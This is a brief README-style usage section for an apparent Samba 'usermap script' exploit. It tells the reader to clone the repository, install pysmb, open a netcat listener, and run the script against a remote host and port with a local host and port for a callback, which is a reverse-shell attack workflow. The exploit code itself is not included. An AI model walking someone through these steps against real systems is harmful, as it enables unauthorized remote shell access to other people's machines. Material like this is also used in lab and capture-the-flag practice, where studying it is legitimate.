usage: git clone https://github.com/micheaol/samba-usermap-script.git

sudo apt install python python-pip

pip install --user pysmb

Start listener:

nc -lvnp listening_port

Then run:

python samba_usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
